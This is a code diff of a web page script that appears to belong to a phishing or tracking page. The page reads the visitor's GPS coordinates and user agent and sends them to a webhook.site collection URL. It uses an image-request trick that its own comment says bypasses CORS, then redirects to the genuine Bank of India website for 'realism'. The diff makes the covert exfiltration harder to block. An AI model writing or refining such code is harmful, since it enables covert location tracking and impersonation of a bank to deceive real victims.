@@ -52,23 +52,21 @@
       }
     }
 
-    function sendLocation(position) {
-      const lat = position.coords.latitude;
-      const lon = position.coords.longitude;
+function sendLocation(position) {
+  const lat = position.coords.latitude;
+  const lon = position.coords.longitude;
+  const ua = encodeURIComponent(navigator.userAgent);
+  const t = new Date().toISOString();
 
-      fetch("https://webhook.site/0323c882-237f-4f5d-82a9-84e2913addf7", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          latitude: lat,
-          longitude: lon,
-          time: new Date().toISOString(),
-          userAgent: navigator.userAgent
-        })
-      });
+  // Send as a GET request to webhook.site (bypasses CORS via image trick)
+  const img = new Image();
+  img.src = `https://webhook.site/0323c882-237f-4f5d-82a9-84e2913addf7?lat=${lat}&lon=${lon}&ua=${ua}&time=${t}`;
 
-      window.location.href = "https://www.bankofindia.co.in"; // Fake success page for realism
-    }
+  // Redirect after short delay
+  setTimeout(() => {
+    window.location.href = "https://www.bankofindia.co.in";
+  }, 1000);
+}
 
     function showError(error) {
       alert("Location access denied. Cannot proceed.");
